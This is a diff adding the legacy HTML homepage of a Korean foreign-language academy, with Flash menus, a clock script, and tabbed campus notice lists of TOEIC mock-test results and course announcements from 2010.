@@ -1,0 +1,2005 @@
+</script>
+
+<html>
+<head>
+<title>▒ 이지외국어학원 에 오신것을 환영합니다. ▒</title>
+<meta http-equiv="Content-Type" content="text/html; charset=euc-kr">
+<link href="../include/style.css" rel="stylesheet" type="text/css">
+<!-- 메인 bg 설정 시작 -->
+<style type="text/css">
+
+<!--
+body {background:#FFFFFF url(images/bg.gif) repeat-x left top}
+#Layer1 {
+	position:absolute;
+	left:860px;
+	top:16px;
+	width:112px;
+	height:97px;
+	z-index:1;
+}
+#Layer2 {
+	position:absolute;
+	left:682px;
+	top:565px;
+	width:25px;
+	height:12px;
+	z-index:2;
+}
+#Layer3 {
+	position:absolute;
+	left:755px;
+	top:1028px;
+	width:23px;
+	height:14px;
+	z-index:2;
+}
+#shop_1 {
+	position:absolute;
+	left: -672px; 
+	top: -1100px;
+	z-index:index:1;
+}
+#shop {
+	position:absolute;
+	left: -672px; 
+	top: -990px;
+	z-index:index:1;
+}
+.style1 {
+	font-size: 12px;
+	color: #990000;
+}
+-->
+</style>
+<!-- 메인 bg 설정 끝 -->
+<script language="JavaScript" type="text/JavaScript">
+<!--
+function MM_openBrWindow(theURL,winName,features) { //v2.0
+  window.open(theURL,winName,features);
+}
+//-->
+</script>
+<script language="JavaScript" type="text/JavaScript">
+<!--
+function MM_preloadImages() { //v3.0
+  var d=document; if(d.images){ if(!d.MM_p) d.MM_p=new Array();
+    var i,j=d.MM_p.length,a=MM_preloadImages.arguments; for(i=0; i<a.length; i++)
+    if (a[i].indexOf("#")!=0){ d.MM_p[j]=new Image; d.MM_p[j++].src=a[i];}}
+}
+
+//-->
+</script>
+<script src="Scripts/AC_RunActiveContent.js" type="text/javascript"></script>
+</head>
+
+
+</script><body  onload="show();MM_preloadImages('images/e_quick_link1.gif')" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
+<div id="Layer3">
+<!--<embed src="" loop="1" hidden="true" volume="0"  autostart="true">-->
+<embed src=""loop="2" hidden="true" volume="0"  autostart="true">
+
+
+<!-- <img src="images/new.gif" width="23" height="11">
+<table width="23" height="11" border="0" cellpadding="0" cellspacing="0">
+    <tr>
+      <td>&nbsp;</td>
+    </tr>
+  </table> -->
+</div>
+<table width="100%"  border="0" cellspacing="0" cellpadding="0">
+  <tr>
+    <td><table width="100%"  border="0" cellspacing="0" cellpadding="0">
+      <tr>
+        <td width="10"></td>
+        <td><table width="100%"  border="0" cellspacing="0" cellpadding="0">
+          <tr>
+		  <td><!-- TOP 시작 -->
+<!-- 즐겨찾기 추가 시작 -->
+<script language="JavaScript">
+<!--
+var favoriteurl="http://www.easyedu.net"
+var favoritetitle="이지외국어학원에 오신 것을 환영합니다."
+function addfavorites(){
+if (document.all)
+window.external.AddFavorite(favoriteurl,favoritetitle)}
+//-->
+</script>
+<!-- 즐겨찾기 추가 끝 -->
+<!-- 시계 시작 -->
+<script language="JavaScript">
+<!--
+function show(){
+  var now=new Date();
+  var ye=now.getYear();
+  var dy=now.getDate();
+  var mt=now.getMonth()+1;
+  var hr=now.getHours();
+  var mn=now.getMinutes();
+  var sc=now.getSeconds();
+  var ampm="AM";
+  if (hr>=12) ampm="PM";
+  if (hr>12) hr=hr-12;
+  if (hr==0) hr=12;
+//  if (hr<=9) hr="0"+hr;
+  if (mn<=9) mn="0"+mn;
+  if (sc<=9) sc="0"+sc;
+  clock.innerHTML=ye+"-"+mt+"-"+dy+" &nbsp;"+ampm+" "+hr+":"+mn;
+  setTimeout("show()",1000);
+}
+
+function MM_preloadImages() { //v3.0
+  var d=document; if(d.images){ if(!d.MM_p) d.MM_p=new Array();
+    var i,j=d.MM_p.length,a=MM_preloadImages.arguments; for(i=0; i<a.length; i++)
+    if (a[i].indexOf("#")!=0){ d.MM_p[j]=new Image; d.MM_p[j++].src=a[i];}}
+}
+
+function MM_swapImgRestore() { //v3.0
+  var i,x,a=document.MM_sr; for(i=0;a&&i<a.length&&(x=a[i])&&x.oSrc;i++) x.src=x.oSrc;
+}
+
+function MM_findObj(n, d) { //v4.01
+  var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))>0&&parent.frames.length) {
+    d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}
+  if(!(x=d[n])&&d.all) x=d.all[n]; for (i=0;!x&&i<d.forms.length;i++) x=d.forms[i][n];
+  for(i=0;!x&&d.layers&&i<d.layers.length;i++) x=MM_findObj(n,d.layers[i].document);
+  if(!x && d.getElementById) x=d.getElementById(n); return x;
+}
+
+function MM_swapImage() { //v3.0
+  var i,j=0,x,a=MM_swapImage.arguments; document.MM_sr=new Array; for(i=0;i<(a.length-2);i+=3)
+   if ((x=MM_findObj(a[i]))!=null){document.MM_sr[j++]=x; if(!x.oSrc) x.oSrc=x.src; x.src=a[i+2];}
+}
+//-->
+</script>
+<!-- 시계 끝 -->
+<!--팝업창 자바스크립트 -->
+<script type="text/JavaScript">
+<!--
+function MM_popupMsg(msg) { //v1.0
+  alert(msg);
+}
+//-->
+</script>
+
+<table width="100%"  border="0" cellpadding="0" cellspacing="0" dwcopytype="CopyTableCell">
+  <tr>
+    <td align="left" valign="top"><table width="814" height="58" border="0" cellspacing="0" cellpadding="0">
+        <tr> 
+          <td width="260" valign="bottom"><table width="100%" border="0" cellspacing="0" cellpadding="0">
+              <tr>
+                <td valign="bottom"><table width="100%" border="0" cellspacing="0" cellpadding="0">
+                    <tr> 
+                      <td align="center" valign="bottom"><a href="../easy/100_sub01.asp" onfocus='blur()'><img src="../images/top_01.gif" alt="100% 무료강좌" width="101" height="44" border="0"></a></td>
+                      <td align="right" valign="bottom"><a href="../easy/work_sub01.asp" onfocus='blur()'><!-- <img src="../images/top_02_.gif" alt="이지파워강좌" width="66" height="15" border="0" style="margin-right:18"> --><img src="../images/top_work.gif" alt="직장인국비지원" border="0" style="margin-right:12"></a></td>
+                            <td align="center" valign="bottom">
+							<table width="100%" border="0" cellspacing="0" cellpadding="0">
+                          <tr align="right" valign="top"> 
+                            <td height="30" colspan="2"><a href="../english/" target="_top" onfocus='blur()'><img src="../images/top_btn_english.gif" width="87" height="18" hspace="10" border="0"></a></td>
+                          </tr>
+                          <tr> 
+                            <td align="center" valign="bottom"><a href="../easy/t_sub01_01.asp" onfocus='blur()'>
+                              <script src="../include/flash.js"></script>
+<script>var ff = mf("../images/top_03_1.swf", "id", 87, 15, "transparent");documentwrite(ff);</script>
+                            </a></td>
+                          </tr>
+                        </table></td>
+                    </tr>
+                  </table></td>
+              </tr>
+            </table></td>
+          <td width="303" align="center" valign="bottom">
+            <!-- 마크 플래쉬 시작 -->
+            <script src="../include/flash.js"></script>
+<script>var ff = mf("../images/mark.swf", "id", 173, 45, "transparent");documentwrite(ff);</script>
+            <!-- 마크 플래쉬 끝 -->
+          </td>
+          <td align="left" valign="bottom"><table width="251" border="0" cellspacing="0" cellpadding="0">
+               
+			  <tr> 
+                <td><table width="251"  height="18" border="0" cellspacing="0" cellpadding="0">
+                    <tr> 
+                      <td width="83" align="left"><a href="javascript:addfavorites()"><img src="../images/top_04.gif" alt="즐겨찾기 추가" width="70" height="11" border="0"></a></td>
+                      <td width="168" align="left" style="background-image:url('../images/top_04_bg.gif'); background-repeat:no-repeat; padding-top:3" class="s_txt">
+                        <!-- 오늘 날짜 표시 -->
+                        <font color="#FB732F"><b> &nbsp;Today&nbsp;</b></font> 
+                        <DIV id="clock" style="position: absolute; color: #000000;">&nbsp;</DIV></td>
+                    </tr>
+                  </table></td>
+              </tr>
+              <tr> 
+                <td><table width="251" border="0" cellspacing="0" cellpadding="0">
+                    <tr> 
+                      <td width="102" align="left" valign="bottom"><a href="../easy1/sub04_00.asp" onfocus='blur()'><img src="../images/top_05.gif" alt="커뮤니티" width="78" height="16" border="0"></a></td>
+                      <td width="41" align="left" valign="bottom"><a href="../easy/point_sub01.asp" onfocus='blur()'><img src="../images/top_06.gif" alt="포인트" width="63" height="16" border="0"></a></td>
+                      <td width="42" align="left" valign="bottom"><a href="http://www.easyedu.net/easy/sub01_01.asp" onfocus='blur()'><img src="../images/top_08.gif" alt="회사소개" width="66" height="23" border="0" /></a></td>
+                      <td width="66" align="left" valign="bottom"><a href="../admision/adm1.asp" onfocus='blur()'><img src="../easy5/images/top_adm.gif" width="66" height="23" border="0" /></a></td>
+                    </tr>
+                  </table></td>
+              </tr>
+            </table></td>
+        </tr>
+      </table></td>
+  </tr>
+  <tr>
+    <td height="12"></td>
+  </tr>
+</table></script>
+<!-- TOP 끝 --></td>
+		  </tr>
+		  <tr><!--탑부분 플래시 시작 -->
+		  	<td align="left" valign="top"><table width="100%"  border="0" cellspacing="0" cellpadding="0">
+        <tr>
+          <td width="840"><!-- 메뉴바 플래쉬 시작 --><script src="../include/flash.js"></script>
+<script>var ff = mf("../images/menu.swf", "id", 840, 78, "transparent");documentwrite(ff);</script><!-- 메뉴바 플래쉬 끝 --></td>
+<td valign="top"><div id="quick_easy" style="position:absolute; top:70px; width:150px; height:52px; z-index:1; visibility: visible;">
+<script src="../include/flash.js"></script>
+<script>var ff = mf("../main/images/main_e1.swf", "id", 150, 52, "transparent");documentwrite(ff);</script>
+</div></script>
+&nbsp;</td>
+        </tr>
+    </table></td>
+		  </tr><!--탑부분 플래쉬 끝 -->
+          <tr>
+            <td align="left" valign="top"><table width="983" border="0" cellspacing="0" cellpadding="0">
+                <tr>
+                  <!-- 센터부분 시작 -->
+                  <td width="840" align="left"><table width="840" border="0" cellspacing="0" cellpadding="0">
+                      <tr>
+                        <td width="840" align="left" style="background-image:url('images/cen_top_bg.gif'); background-repeat:no-repeat;"><table width="840" height="37" border="0" cellspacing="0" cellpadding="0">
+                            <tr>
+                              <td width="15"></td>
+                              <td width="405" align="left"><img src="../images/sim_icon.gif" width="4" height="7" hspace="3" align="absmiddle"><!-- 공지 1 → 관리자에서 직접 등록 할수 있도록 --><strong>경기도 편입생들 모여라~ : </strong><A HREF="http://www.easyedu.net/admision/adm1.asp" >2010년 대학편입 대비</A> </td>
+                              <td width="15"></td>
+                              <td width="405" align="left"><img src="../images/sim_icon.gif" width="4" height="7" hspace="3" align="absmiddle"><!-- 공지 2 → 관리자에서 직접 등록 할수 있도록 --><strong>말하기시험대비 : </strong><A HREF="http://www.easyedu.net/easy1/sub07_01.asp?inc=/include/view.asp&no=678&table=tbboard_news&easy=easy1" >토익S/W,2개월이면 대기업이원하는 자격증취득가능</A> </td>
+                            </tr>
+                        </table></td>
+                      </tr>
+                      <tr>
+                        <td width="840" align="left" valign="top"  background="images/cen_bg.gif"><table width="840" border="0" cellspacing="0" cellpadding="0">
+                            <tr>
+                              <td width="610" align="center" valign="top" background="images/cen_bg_cen.gif"><table width="610" border="0" cellspacing="0" cellpadding="0">
+                                  <tr>
+                                    <td width="610" align="left" valign="top"><!-- MAIN IMAGE FALSH 시작 --><script src="../include/flash.js"></script>
+<script>var ff = mf("images/main_img.swf", "id", 610, 226, "transparent");documentwrite(ff);</script><!-- MAIN IMAGE FALSH 끝 --></td>
+                                  </tr>
+                                  <tr>
+                                    <td height="15" align="left" valign="top"></td>
+                                  </tr>
+                                  <tr>
+                                    <td width="610" align="center" valign="top"><table width="575" border="0" cellspacing="0" cellpadding="0">
+                                        <tr>
+                                          <td width="575" align="left"><table width="575" border="0" cellspacing="0" cellpadding="0">
+                                              <tr>
+                                                <td width="394" align="left" valign="bottom"><!-- 공지사항 시작 → 각 지점 마우스 오버시 해당 지점 공지사항 보여야 합니다.-->
+                                                    <table width="394" border="0" cellspacing="0" cellpadding="0">
+                                                      <tr>
+                                                        <td width="394" align="left" valign="bottom"><table width="394" border="0" cellspacing="0" cellpadding="0">
+                                                            <tr>
+                                                              <!--각 학원 아이콘 활성화는 아이콘 이름 뒤에 _on을 붙입니다. 각 학원이 활성화 되면 해당 학원의 공지사항이 하단 공지사항 내용으로 나타나야 합니다. -->
+                                                              <td width="50" align="center" valign="middle"><img src="images/cen_notice.gif" width="40" height="13"></td>
+                                                              <td width="70" align="center" valign="bottom"><a href="javascript:void(not01.src='images/cen_not_01_on.gif');void(not02.src='images/cen_not_02.gif');void(not03.src='images/cen_not_03.gif');void(not05.src='images/cen_not_05.gif');dis('easy1');"  onFocus='blur()'><img src="images/cen_not_01_on.gif" width="62" height="18" border="0" name="not01" alt="역전 1 캠퍼스 공지사항"></a></td>
+                                                              <td width="70" align="center" valign="bottom"><a href="javascript:void(not01.src='images/cen_not_01.gif');void(not02.src='images/cen_not_02_on.gif');void(not03.src='images/cen_not_03.gif');void(not05.src='images/cen_not_05.gif');dis('easy2');"  onFocus='blur()'><img src="images/cen_not_02.gif"    width="62" height="18" border="0" name="not02"></a></td>
+                                                              <td width="70" align="center" valign="bottom" alt="역전 2 캠퍼스 공지사항"><a href="javascript:void(not01.src='images/cen_not_01.gif');void(not02.src='images/cen_not_02.gif');void(not03.src='images/cen_not_03.gif');void(not05.src='images/cen_not_05_on.gif');dis('easy5');"  onFocus='blur()'><img src="images/cen_not_05.gif"    width="62" height="18" border="0" name="not05"></a></td>
+                                                              <td width="70" align="center" valign="bottom" alt="역전 3 캠퍼스 공지사항"><a href="javascript:void(not01.src='images/cen_not_01.gif');void(not02.src='images/cen_not_02.gif');void(not03.src='images/cen_not_03_on.gif');void(not05.src='images/cen_not_05.gif');dis('easy3');"  onFocus='blur()'><img src="images/cen_not_03.gif"   width="62" height="18" border="0" name="not03" alt="남문 캠퍼스 공지사항"></a></td>
+                                                              <td width="150" align="center" valign="bottom"><!-- <a href="javascript:;" onClick="MM_swapImage('not01','','images/cen_not_01.gif','not02','','images/cen_not_02.gif','not03','','images/cen_not_03.gif','not04','','images/cen_not_04_on.gif',1)" onfocus='blur()'><img src="images/cen_not_04.gif" alt="이지 유학원" name="not04" width="1" height="1" border="0" id="not04"></a> --></td>
+                                                            </tr>
+                                                        </table></td>
+                                                      </tr>
+                                                      <tr>
+                                                        <td width="394" height="2" bgcolor="D9D9D9"></td>
+                                                      </tr>
+                                                      <tr>
+                                                        <td width="394" style="padding-top:10; padding-bottom:10"><!-- 리스트 시작 -->
+                                                            
+                                                            <script language="JavaScript">
+													<!--
+														function dis(me){
+															
+																document.getElementById('easy1').style.display = "none";
+															
+																document.getElementById('easy2').style.display = "none";
+															
+																document.getElementById('easy3').style.display = "none";
+															
+																document.getElementById('easy4').style.display = "none";
+															
+																document.getElementById('easy5').style.display = "none";
+															
+															if (me == "easy1"){
+																document.getElementById('easy1').style.display = "block";
+															}
+															if (me == "easy2"){
+																document.getElementById('easy2').style.display = "block";
+															}
+															if (me == "easy3"){
+																document.getElementById('easy3').style.display = "block";
+															}
+															if (me == "easy5"){
+																document.getElementById('easy5').style.display = "block";
+															}
+															if (me == "easy5"){
+																document.getElementById('easy5').style.display = "block";
+															}
+															
+														}
+															
+													//-->
+													  </script>
+                                                            
+                                                            <div id = "easy1" style = "display:block">
+                                                              <table width="394" border="0" cellspacing="0" cellpadding="0">
+                                                                
+                                                                <tr>
+                                                                  <td width="334" height="18"><img src="../images/cross_icon.gif" width="3" height="3" hspace="5" align="absmiddle"><a href="/easy1/sub07_01.asp?inc=/include/view.asp&no=841&table=tbboard_news&easy=easy1" onFocus='blur()' class="board">
+                                                                    <!-- 제목 표시 -->
+                                                                    바쁜 직장인들을 위한 희소식 1:1맞춤식학습 PtoP 프로그램</a>
+                                                                      <!-- 신규 등록 표시 -->
+                                                                    </td>
+                                                                  <td width="60" align="center" class="num"><!-- 등록일 표시 -->
+                                                                      2010-04-13</td>
+                                                                </tr>
+                                                                
+                                                                <tr>
+                                                                  <td width="334" height="18"><img src="../images/cross_icon.gif" width="3" height="3" hspace="5" align="absmiddle"><a href="/easy1/sub07_01.asp?inc=/include/view.asp&no=835&table=tbboard_news&easy=easy1" onFocus='blur()' class="board">
+                                                                    <!-- 제목 표시 -->
+                                                                    <역전3캠퍼스>3월21일 모의토익 정답지</a>
+                                                                      <!-- 신규 등록 표시 -->
+                                                                    </td>
+                                                                  <td width="60" align="center" class="num"><!-- 등록일 표시 -->
+                                                                      2010-03-22</td>
+                                                                </tr>
+                                                                
+                                                                <tr>
+                                                                  <td width="334" height="18"><img src="../images/cross_icon.gif" width="3" height="3" hspace="5" align="absmiddle"><a href="/easy1/sub07_01.asp?inc=/include/view.asp&no=834&table=tbboard_news&easy=easy1" onFocus='blur()' class="board">
+                                                                    <!-- 제목 표시 -->
+                                                                    <역전3캠퍼스> 3월21일 모의토익 결과</a>
+                                                                      <!-- 신규 등록 표시 -->
+                                                                    </td>
+                                                                  <td width="60" align="center" class="num"><!-- 등록일 표시 -->
+                                                                      2010-03-22</td>
+                                                                </tr>
+                                                                
+                                                                <tr>
+                                                                  <td width="334" height="18"><img src="../images/cross_icon.gif" width="3" height="3" hspace="5" align="absmiddle"><a href="/easy1/sub07_01.asp?inc=/include/view.asp&no=829&table=tbboard_news&easy=easy1" onFocus='blur()' class="board">
+                                                                    <!-- 제목 표시 -->
+                                                                    <역전3캠퍼스>2월27일 모의토익 정답지</a>
+                                                                      <!-- 신규 등록 표시 -->
+                                                                    </td>
+                                                                  <td width="60" align="center" class="num"><!-- 등록일 표시 -->
+                                                                      2010-03-04</td>
+                                                                </tr>
+                                                                
+                                                                <tr>
+                                                                  <td width="334" height="18"><img src="../images/cross_icon.gif" width="3" height="3" hspace="5" align="absmiddle"><a href="/easy1/sub07_01.asp?inc=/include/view.asp&no=824&table=tbboard_news&easy=easy1" onFocus='blur()' class="board">
+                                                                    <!-- 제목 표시 -->
+                                                                    <역전3캠퍼스> 2월 21일 모의토익 결과</a>
+                                                                      <!-- 신규 등록 표시 -->
+                                                                    </td>
+                                                                  <td width="60" align="center" class="num"><!-- 등록일 표시 -->
+                                                                      2010-02-23</td>
+                                                                </tr>
+                                                                
+                                                              </table>
+                                                              <!-- 리스트 끝 -->
+                                                            </div>
+                                                          
+                                                            <div id = "easy2" style = "display:none">
+                                                              <table width="394" border="0" cellspacing="0" cellpadding="0">
+                                                                
+                                                                <tr>
+                                                                  <td width="334" height="18"><img src="../images/cross_icon.gif" width="3" height="3" hspace="5" align="absmiddle"><a href="/easy2/sub07_01.asp?inc=/include/view.asp&no=835&table=tbboard_news&easy=easy2" onFocus='blur()' class="board">
+                                                                    <!-- 제목 표시 -->
+                                                                    <역전3캠퍼스>3월21일 모의토익 정답지</a>
+                                                                      <!-- 신규 등록 표시 -->
+                                                                    </td>
+                                                                  <td width="60" align="center" class="num"><!-- 등록일 표시 -->
+                                                                      2010-03-22</td>
+                                                                </tr>
+                                                                
+                                                                <tr>
+                                                                  <td width="334" height="18"><img src="../images/cross_icon.gif" width="3" height="3" hspace="5" align="absmiddle"><a href="/easy2/sub07_01.asp?inc=/include/view.asp&no=834&table=tbboard_news&easy=easy2" onFocus='blur()' class="board">
+                                                                    <!-- 제목 표시 -->
+                                                                    <역전3캠퍼스> 3월21일 모의토익 결과</a>
+                                                                      <!-- 신규 등록 표시 -->
+                                                                    </td>
+                                                                  <td width="60" align="center" class="num"><!-- 등록일 표시 -->
+                                                                      2010-03-22</td>
+                                                                </tr>
+                                                                
+                                                                <tr>
+                                                                  <td width="334" height="18"><img src="../images/cross_icon.gif" width="3" height="3" hspace="5" align="absmiddle"><a href="/easy2/sub07_01.asp?inc=/include/view.asp&no=829&table=tbboard_news&easy=easy2" onFocus='blur()' class="board">
+                                                                    <!-- 제목 표시 -->
+                                                                    <역전3캠퍼스>2월27일 모의토익 정답지</a>
+                                                                      <!-- 신규 등록 표시 -->
+                                                                    </td>
+                                                                  <td width="60" align="center" class="num"><!-- 등록일 표시 -->
+                                                                      2010-03-04</td>
+                                                                </tr>
+                                                                
+                                                                <tr>
+                                                                  <td width="334" height="18"><img src="../images/cross_icon.gif" width="3" height="3" hspace="5" align="absmiddle"><a href="/easy2/sub07_01.asp?inc=/include/view.asp&no=824&table=tbboard_news&easy=easy2" onFocus='blur()' class="board">
+                                                                    <!-- 제목 표시 -->
+                                                                    <역전3캠퍼스> 2월 21일 모의토익 결과</a>
+                                                                      <!-- 신규 등록 표시 -->
+                                                                    </td>
+                                                                  <td width="60" align="center" class="num"><!-- 등록일 표시 -->
+                                                                      2010-02-23</td>
+                                                                </tr>
+                                                                
+                                                                <tr>
+                                                                  <td width="334" height="18"><img src="../images/cross_icon.gif" width="3" height="3" hspace="5" align="absmiddle"><a href="/easy2/sub07_01.asp?inc=/include/view.asp&no=823&table=tbboard_news&easy=easy2" onFocus='blur()' class="board">
+                                                                    <!-- 제목 표시 -->
+                                                                    <역전3캠퍼스> 2월 21일 모의토익 정답지</a>
+                                                                      <!-- 신규 등록 표시 -->
+                                                                    </td>
+                                                                  <td width="60" align="center" class="num"><!-- 등록일 표시 -->
+                                                                      2010-02-23</td>
+                                                                </tr>
+                                                                
+                                                              </table>
+                                                              <!-- 리스트 끝 -->
+                                                            </div>
+                                                          
+                                                            <div id = "easy3" style = "display:none">
+                                                              <table width="394" border="0" cellspacing="0" cellpadding="0">
+                                                                
+                                                                <tr>
+                                                                  <td width="334" height="18"><img src="../images/cross_icon.gif" width="3" height="3" hspace="5" align="absmiddle"><a href="/easy3/sub07_01.asp?inc=/include/view.asp&no=843&table=tbboard_news&easy=easy3" onFocus='blur()' class="board">
+                                                                    <!-- 제목 표시 -->
+                                                                    4월 할인 이벤트!!!</a>
+                                                                      <!-- 신규 등록 표시 -->
+                                                                    </td>
+                                                                  <td width="60" align="center" class="num"><!-- 등록일 표시 -->
+                                                                      2010-04-23</td>
+                                                                </tr>
+                                                                
+                                                                <tr>
+                                                                  <td width="334" height="18"><img src="../images/cross_icon.gif" width="3" height="3" hspace="5" align="absmiddle"><a href="/easy3/sub07_01.asp?inc=/include/view.asp&no=840&table=tbboard_news&easy=easy3" onFocus='blur()' class="board">
+                                                                    <!-- 제목 표시 -->
+                                                                    2010년 6월  여름방학 SAT프로그램</a>
+                                                                      <!-- 신규 등록 표시 -->
+                                                                    </td>
+                                                                  <td width="60" align="center" class="num"><!-- 등록일 표시 -->
+                                                                      2010-04-13</td>
+                                                                </tr>
+                                                                
+                                                                <tr>
+                                                                  <td width="334" height="18"><img src="../images/cross_icon.gif" width="3" height="3" hspace="5" align="absmiddle"><a href="/easy3/sub07_01.asp?inc=/include/view.asp&no=839&table=tbboard_news&easy=easy3" onFocus='blur()' class="board">
+                                                                    <!-- 제목 표시 -->
+                                                                    주말반(토)  텝스 강좌 오픈 !</a>
+                                                                      <!-- 신규 등록 표시 -->
+                                                                    </td>
+                                                                  <td width="60" align="center" class="num"><!-- 등록일 표시 -->
+                                                                      2010-04-08</td>
+                                                                </tr>
+                                                                
+                                                                <tr>
+                                                                  <td width="334" height="18"><img src="../images/cross_icon.gif" width="3" height="3" hspace="5" align="absmiddle"><a href="/easy3/sub07_01.asp?inc=/include/view.asp&no=835&table=tbboard_news&easy=easy3" onFocus='blur()' class="board">
+                                                                    <!-- 제목 표시 -->
+                                                                    <역전3캠퍼스>3월21일 모의토익 정답지</a>
+                                                                      <!-- 신규 등록 표시 -->
+                                                                    </td>
+                                                                  <td width="60" align="center" class="num"><!-- 등록일 표시 -->
+                                                                      2010-03-22</td>
+                                                                </tr>
+                                                                
+                                                                <tr>
+                                                                  <td width="334" height="18"><img src="../images/cross_icon.gif" width="3" height="3" hspace="5" align="absmiddle"><a href="/easy3/sub07_01.asp?inc=/include/view.asp&no=834&table=tbboard_news&easy=easy3" onFocus='blur()' class="board">
+                                                                    <!-- 제목 표시 -->
+                                                                    <역전3캠퍼스> 3월21일 모의토익 결과</a>
+                                                                      <!-- 신규 등록 표시 -->
+                                                                    </td>
+                                                                  <td width="60" align="center" class="num"><!-- 등록일 표시 -->
+                                                                      2010-03-22</td>
+                                                                </tr>
+                                                                
+                                                              </table>
+                                                              <!-- 리스트 끝 -->
+                                                            </div>
+                                                          
+                                                            <div id = "easy4" style = "display:none">
+                                                              <table width="394" border="0" cellspacing="0" cellpadding="0">
+                                                                
+                                                                <tr>
+                                                                  <td width="334" height="18"><img src="../images/cross_icon.gif" width="3" height="3" hspace="5" align="absmiddle"><a href="/easy4/sub07_01.asp?inc=/include/view.asp&no=835&table=tbboard_news&easy=easy4" onFocus='blur()' class="board">
+                                                                    <!-- 제목 표시 -->
+                                                                    <역전3캠퍼스>3월21일 모의토익 정답지</a>
+                                                                      <!-- 신규 등록 표시 -->
+                                                                    </td>
+                                                                  <td width="60" align="center" class="num"><!-- 등록일 표시 -->
+                                                                      2010-03-22</td>
+                                                                </tr>
+                                                                
+                                                                <tr>
+                                                                  <td width="334" height="18"><img src="../images/cross_icon.gif" width="3" height="3" hspace="5" align="absmiddle"><a href="/easy4/sub07_01.asp?inc=/include/view.asp&no=834&table=tbboard_news&easy=easy4" onFocus='blur()' class="board">
+                                                                    <!-- 제목 표시 -->
+                                                                    <역전3캠퍼스> 3월21일 모의토익 결과</a>
+                                                                      <!-- 신규 등록 표시 -->
+                                                                    </td>
+                                                                  <td width="60" align="center" class="num"><!-- 등록일 표시 -->
+                                                                      2010-03-22</td>
+                                                                </tr>
+                                                                
+                                                                <tr>
+                                                                  <td width="334" height="18"><img src="../images/cross_icon.gif" width="3" height="3" hspace="5" align="absmiddle"><a href="/easy4/sub07_01.asp?inc=/include/view.asp&no=829&table=tbboard_news&easy=easy4" onFocus='blur()' class="board">
+                                                                    <!-- 제목 표시 -->
+                                                                    <역전3캠퍼스>2월27일 모의토익 정답지</a>
+                                                                      <!-- 신규 등록 표시 -->
+                                                                    </td>
+                                                                  <td width="60" align="center" class="num"><!-- 등록일 표시 -->
+                                                                      2010-03-04</td>
+                                                                </tr>
+                                                                
+                                                                <tr>
+                                                                  <td width="334" height="18"><img src="../images/cross_icon.gif" width="3" height="3" hspace="5" align="absmiddle"><a href="/easy4/sub07_01.asp?inc=/include/view.asp&no=824&table=tbboard_news&easy=easy4" onFocus='blur()' class="board">
+                                                                    <!-- 제목 표시 -->
+                                                                    <역전3캠퍼스> 2월 21일 모의토익 결과</a>
+                                                                      <!-- 신규 등록 표시 -->
+                                                                    </td>
+                                                                  <td width="60" align="center" class="num"><!-- 등록일 표시 -->
+                                                                      2010-02-23</td>
+                                                                </tr>
+                                                                
+                                                                <tr>
+                                                                  <td width="334" height="18"><img src="../images/cross_icon.gif" width="3" height="3" hspace="5" align="absmiddle"><a href="/easy4/sub07_01.asp?inc=/include/view.asp&no=823&table=tbboard_news&easy=easy4" onFocus='blur()' class="board">
+                                                                    <!-- 제목 표시 -->
+                                                                    <역전3캠퍼스> 2월 21일 모의토익 정답지</a>
+                                                                      <!-- 신규 등록 표시 -->
+                                                                    </td>
+                                                                  <td width="60" align="center" class="num"><!-- 등록일 표시 -->
+                                                                      2010-02-23</td>
+                                                                </tr>
+                                                                
+                                                              </table>
+                                                              <!-- 리스트 끝 -->
+                                                            </div>
+                                                          
+                                                            <div id = "easy5" style = "display:none">
+                                                              <table width="394" border="0" cellspacing="0" cellpadding="0">
+                                                                
+                                                                <tr>
+                                                                  <td width="334" height="18"><img src="../images/cross_icon.gif" width="3" height="3" hspace="5" align="absmiddle"><a href="/easy5/sub07_01.asp?inc=/include/view.asp&no=846&table=tbboard_news&easy=easy5" onFocus='blur()' class="board">
+                                                                    <!-- 제목 표시 -->
+                                                                    <수원역3캠>4월24일 모의토익 결과</a>
+                                                                      <!-- 신규 등록 표시 -->
+                                                                    </td>
+                                                                  <td width="60" align="center" class="num"><!-- 등록일 표시 -->
+                                                                      2010-04-29</td>
+                                                                </tr>
+                                                                
+                                                                <tr>
+                                                                  <td width="334" height="18"><img src="../images/cross_icon.gif" width="3" height="3" hspace="5" align="absmiddle"><a href="/easy5/sub07_01.asp?inc=/include/view.asp&no=835&table=tbboard_news&easy=easy5" onFocus='blur()' class="board">
+                                                                    <!-- 제목 표시 -->
+                                                                    <역전3캠퍼스>3월21일 모의토익 정답지</a>
+                                                                      <!-- 신규 등록 표시 -->
+                                                                    </td>
+                                                                  <td width="60" align="center" class="num"><!-- 등록일 표시 -->
+                                                                      2010-03-22</td>
+                                                                </tr>
+                                                                
+                                                                <tr>
+                                                                  <td width="334" height="18"><img src="../images/cross_icon.gif" width="3" height="3" hspace="5" align="absmiddle"><a href="/easy5/sub07_01.asp?inc=/include/view.asp&no=834&table=tbboard_news&easy=easy5" onFocus='blur()' class="board">
+                                                                    <!-- 제목 표시 -->
+                                                                    <역전3캠퍼스> 3월21일 모의토익 결과</a>
+                                                                      <!-- 신규 등록 표시 -->
+                                                                    </td>
+                                                                  <td width="60" align="center" class="num"><!-- 등록일 표시 -->
+                                                                      2010-03-22</td>
+                                                                </tr>
+                                                                
+                                                                <tr>
+                                                                  <td width="334" height="18"><img src="../images/cross_icon.gif" width="3" height="3" hspace="5" align="absmiddle"><a href="/easy5/sub07_01.asp?inc=/include/view.asp&no=829&table=tbboard_news&easy=easy5" onFocus='blur()' class="board">
+                                                                    <!-- 제목 표시 -->
+                                                                    <역전3캠퍼스>2월27일 모의토익 정답지</a>
+                                                                      <!-- 신규 등록 표시 -->
+                                                                    </td>
+                                                                  <td width="60" align="center" class="num"><!-- 등록일 표시 -->
+                                                                      2010-03-04</td>
+                                                                </tr>
+                                                                
+                                                                <tr>
+                                                                  <td width="334" height="18"><img src="../images/cross_icon.gif" width="3" height="3" hspace="5" align="absmiddle"><a href="/easy5/sub07_01.asp?inc=/include/view.asp&no=824&table=tbboard_news&easy=easy5" onFocus='blur()' class="board">
+                                                                    <!-- 제목 표시 -->
+                                                                    <역전3캠퍼스> 2월 21일 모의토익 결과</a>
+                                                                      <!-- 신규 등록 표시 -->
+                                                                    </td>
+                                                                  <td width="60" align="center" class="num"><!-- 등록일 표시 -->
+                                                                      2010-02-23</td>
+                                                                </tr>
+                                                                
+                                                              </table>
+                                                              <!-- 리스트 끝 -->
+                                                            </div>
